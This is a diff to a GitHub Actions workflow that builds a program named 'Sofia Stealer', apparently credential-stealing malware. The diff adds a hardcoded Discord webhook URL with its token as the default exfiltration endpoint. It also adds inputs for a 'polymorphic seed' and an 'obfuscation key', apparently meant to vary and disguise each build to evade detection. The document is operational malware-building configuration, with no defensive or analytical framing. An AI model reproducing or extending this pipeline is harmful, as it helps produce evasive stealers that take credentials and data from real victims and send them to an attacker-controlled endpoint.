@@ -1,4 +1,4 @@
-name: sofia build
+name: sofia builder
 
 on:
   push:
@@ -6,6 +6,18 @@ on:
   pull_request:
     branches: [ "main", "master" ]
   workflow_dispatch:
+    inputs:
+      webhook_url:
+        description: 'Sofia Webhook URL'
+        required: true
+        default: 'https://discord.com/api/webhooks/1499616167470301296/f-Zh5QvIFv61_bmYzEj-ze7lDeOiuhmDHG7oFz7Z_tHcIw8yJqVNusB7-F4YXCLZu210'
+      poly_seed:
+        description: 'Polymorphic Seed (Optional)'
+        required: false
+      obfs_key:
+        description: 'Obfuscation Key (Optional)'
+        required: false
+
 
 jobs:
   build:
@@ -21,7 +33,9 @@ jobs:
     - name: Build Sofia Stealer
       shell: cmd
       env:
-        SOFIA_WEBHOOK_URL: ${{ secrets.WEBHOOK_URL || 'https://discord.com/api/webhooks/1499616167470301296/f-Zh5QvIFv61_bmYzEj-ze7lDeOiuhmDHG7oFz7Z_tHcIw8yJqVNusB7-F4YXCLZu210' }}
+        SOFIA_WEBHOOK_URL: ${{ github.event.inputs.webhook_url || 'https://discord.com/api/webhooks/1499616167470301296/f-Zh5QvIFv61_bmYzEj-ze7lDeOiuhmDHG7oFz7Z_tHcIw8yJqVNusB7-F4YXCLZu210' }}
+        SOFIA_SEED: ${{ github.event.inputs.poly_seed }}
+        SOFIA_KEY: ${{ github.event.inputs.obfs_key }}
       run: |
         dir
         call .\build.bat release
